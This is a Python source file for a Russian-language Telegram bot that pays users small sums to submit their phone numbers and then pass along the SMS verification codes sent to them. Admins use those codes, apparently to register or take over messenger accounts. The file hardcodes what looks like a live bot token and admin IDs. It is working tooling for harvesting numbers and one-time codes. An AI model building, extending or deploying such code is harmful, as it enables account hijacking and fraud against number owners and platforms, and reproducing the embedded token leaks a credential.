import asyncio
import logging
import aiosqlite
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery)

# --- КОНФИГУРАЦИЯ ---
TOKEN = "8220500651:AAHKBf-AZ3UT7kH1oOrEEl-NwDWSE4DYoWw"
ADMIN_IDS = [7323981601, 8383446699] 
CHANNEL_LINK = "https://t.me/+4K_4dildrI82ODY6"
CHANNEL_ID = -1003532318157

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

WORK_STATUS = True 

# --- СОСТОЯНИЯ ---
class Form(StatesGroup):
    choosing_tariff = State()
    entering_number = State()
    entering_code = State()
    broadcasting = State()

# --- БАЗА ДАННЫХ ---
async def init_db():
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
        await db.execute('''CREATE TABLE IF NOT EXISTS requests 
                           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
                            phone TEXT, tariff TEXT, code TEXT, status INTEGER DEFAULT 0)''')
        await db.commit()

# --- КЛАВИАТУРЫ ---
def main_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="📱 Сдать номер")],
        [KeyboardButton(text="📢 Канал/Чат")]
    ], resize_keyboard=True)

def tariff_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="⚡️ 1.5$ Рег Момент")],
        [KeyboardButton(text="🌙 2.5$ Вбх вечер")],
        [KeyboardButton(text="🔙 Назад")]
    ], resize_keyboard=True)

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📂 Новые заявки", callback_data="admin_view_new")],
        [InlineKeyboardButton(text="✅ Start Work", callback_data="work_start"),
         InlineKeyboardButton(text="❌ Stop Work", callback_data="work_stop")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")]
    ])

# --- ПРОВЕРКА ПОДПИСКИ ---
async def check_sub(user_id):
    try:
        m = await bot.get_chat_member(CHANNEL_ID, user_id)
        return m.status in ['member', 'administrator', 'creator']
    except: return False

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def start(message: types.Message):
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('INSERT OR IGNORE INTO users VALUES (?)', (message.from_user.id,))
        await db.commit()
    if not await check_sub(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔗 Вступить", url=CHANNEL_LINK)],
            [InlineKeyboardButton(text="🔄 Проверить", callback_data="check_sub_now")]
        ])
        return await message.answer("⚠️ Подпишитесь на канал!", reply_markup=kb)
    await message.answer(f"👋 Привет! Выбирай пункт меню:", reply_markup=main_kb())

@dp.callback_query(F.data == "check_sub_now")
async def check_sub_callback(callback: CallbackQuery):
    if await check_sub(callback.from_user.id):
        await callback.message.delete()
        await callback.message.answer("✅ Доступ открыт!", reply_markup=main_kb())
    else:
        await callback.answer("❌ Вы не подписаны!", show_alert=True)

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id in ADMIN_IDS:
        await message.answer(f"🛠 Админ-панель", reply_markup=admin_kb())

# --- ЛОГИКА РАБОТЫ С НОМЕРОМ ---

@dp.message(F.text == "📱 Сдать номер")
async def rent_start(message: types.Message, state: FSMContext):
    if not WORK_STATUS:
        return await message.answer("😴 Мы сейчас отдыхаем.")
    await state.set_state(Form.choosing_tariff)
    await message.answer("💵 Выберите тариф:", reply_markup=tariff_kb())

@dp.message(Form.choosing_tariff)
async def rent_tariff(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        return await message.answer("Меню:", reply_markup=main_kb())
    await state.update_data(tariff=message.text)
    await state.set_state(Form.entering_number)
    await message.answer("📲 Введите номер (цифры):", reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔙 Назад")]], resize_keyboard=True))

@dp.message(Form.entering_number)
async def rent_number(message: types.Message, state: FSMContext):
    phone = re.sub(r'\D', '', message.text)
    if len(phone) < 7: return await message.answer("❌ Ошибка в номере.")
    data = await state.get_data()

    async with aiosqlite.connect('bot_database.db') as db:
        cursor = await db.execute('INSERT INTO requests (user_id, phone, tariff) VALUES (?, ?, ?)', 
                                 (message.from_user.id, phone, data['tariff']))
        request_id = cursor.lastrowid
        await db.commit()
    
    # Кнопки для админа: Взять или Отмена
    admin_action_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Взять в работу", callback_data=f"take_{request_id}_{message.from_user.id}")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"cancelreq_{request_id}_{message.from_user.id}")],
        [InlineKeyboardButton(text="💬 Чат", url=f"tg://user?id={message.from_user.id}")]
    ])

    for admin_id in ADMIN_IDS:
        await bot.send_message(admin_id, f"🆕 **Новая заявка #{request_id}**\n📱: `{phone}`\n💰: {data['tariff']}", 
                             parse_mode="Markdown", reply_markup=admin_action_kb)
    
    await state.clear()
    await message.answer("⏳ **Номер отправлен!**\nПожалуйста, не закрывайте бот. Как только админ возьмет номер, я попрошу код.", reply_markup=main_kb())

# --- ОБРАБОТКА КНОПОК АДМИНА (ВЗЯТЬ / ОТМЕНА) ---

@dp.callback_query(F.data.startswith("take_"))
async def admin_take_number(callback: CallbackQuery, state: FSMContext):
    _, req_id, user_id = callback.data.split("_")
    
    # Уведомляем пользователя и переводим его в режим ожидания кода
    try:
        # Принудительно ставим состояние пользователю через bot и FSMContext
        user_state = dp.fsm.get_context(bot, chat_id=int(user_id), user_id=int(user_id))
        await user_state.set_state(Form.entering_code)
        await bot.send_message(user_id, "🔔 **Админ взял ваш номер!**\nСМС отправлено. Введите код из СМС ниже 👇", parse_mode="Markdown")
        await callback.message.edit_text(callback.message.text + "\n\nСтатус: 🟡 **Взят в работу**")
        await callback.answer("Пользователь уведомлен, ждем код.")
    except Exception as e:
        await callback.answer("Ошибка: не удалось уведомить юзера", show_alert=True)

@dp.callback_query(F.data.startswith("cancelreq_"))
async def admin_cancel_request(callback: CallbackQuery):
    _, req_id, user_id = callback.data.split("_")
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('DELETE FROM requests WHERE id = ?', (req_id,))
        await db.commit()
    
    try:
        await bot.send_message(user_id, "❌ Ваша заявка отклонена администратором.")
        await callback.message.edit_text(callback.message.text + "\n\nСтатус: ❌ **Отклонено**")
    except: pass
    await callback.answer("Заявка отменена.")

# --- ВВОД КОДА ПОЛЬЗОВАТЕЛЕМ ---

@dp.message(Form.entering_code)
async def user_enters_code(message: types.Message, state: FSMContext):
    code = message.text
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('UPDATE requests SET code = ? WHERE user_id = ? AND status = 0', (code, message.from_user.id))
        await db.commit()

    chat_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💬 Открыть чат", url=f"tg://user?id={message.from_user.id}")],
        [InlineKeyboardButton(text="✅ Готово (Завершить)", callback_data="admin_close")]
    ])

    for admin_id in ADMIN_IDS:
        await bot.send_message(admin_id, f"🔑 **Пришел КОД!**\n👤 Юзер: {message.from_user.id}\n💬 Код: `{code}`", 
                             parse_mode="Markdown", reply_markup=chat_kb)
    
    await state.clear()
    await message.answer("✅ Код успешно передан! Ожидайте подтверждения.", reply_markup=main_kb())

# --- ОСТАЛЬНЫЕ ФУНКЦИИ ---

@dp.callback_query(F.data == "admin_close")
async def admin_close(callback: CallbackQuery):
    await callback.message.delete()

@dp.callback_query(F.data == "admin_view_new")
async def view_requests(callback: CallbackQuery):
    async with aiosqlite.connect('bot_database.db') as db:
        async with db.execute('SELECT id, phone, tariff, user_id FROM requests WHERE status = 0 AND code IS NULL LIMIT 1') as cursor:
            row = await cursor.fetchone()
    if not row: return await callback.answer("Нет новых заявок.")
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Взять", callback_data=f"take_{row[0]}_{row[3]}")],
        [InlineKeyboardButton(text="❌ Отмена", callback_data=f"cancelreq_{row[0]}_{row[3]}")]
    ])
    await callback.message.answer(f"Заявка #{row[0]}\n📱: `{row[1]}`", reply_markup=kb, parse_mode="Markdown")

@dp.callback_query(F.data.startswith("work_"))
async def work_toggle(callback: CallbackQuery):
    global WORK_STATUS
    action = callback.data.split("_")[1]
    WORK_STATUS = (action == "start")
    await callback.message.answer(f"Статус изменен на: {'РАБОТАЕМ' if WORK_STATUS else 'ОТДЫХ'}")

async def main():
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
